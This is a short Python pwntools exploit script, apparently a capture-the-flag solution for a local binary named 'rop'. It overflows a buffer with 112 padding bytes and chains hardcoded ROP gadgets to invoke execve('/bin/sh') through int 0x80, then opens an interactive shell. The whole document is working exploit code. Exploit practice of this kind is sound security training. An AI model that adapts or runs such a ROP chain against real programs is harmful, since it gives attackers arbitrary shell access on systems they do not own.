from pwn import *

p = process('./rop')

pop_eax_ret=0x080bb196
pop_edx_ecx_ebx_ret=0x0806eb90
binsh=0x080be408
int_80=0x08049421

payload=b'A'*112+p32(pop_eax_ret)+p32(0xb)+p32(pop_edx_ecx_ebx_ret)+p32(0)+p32(0)+p32(binsh)+p32(int_80)

p.sendline(payload)
p.interactive()
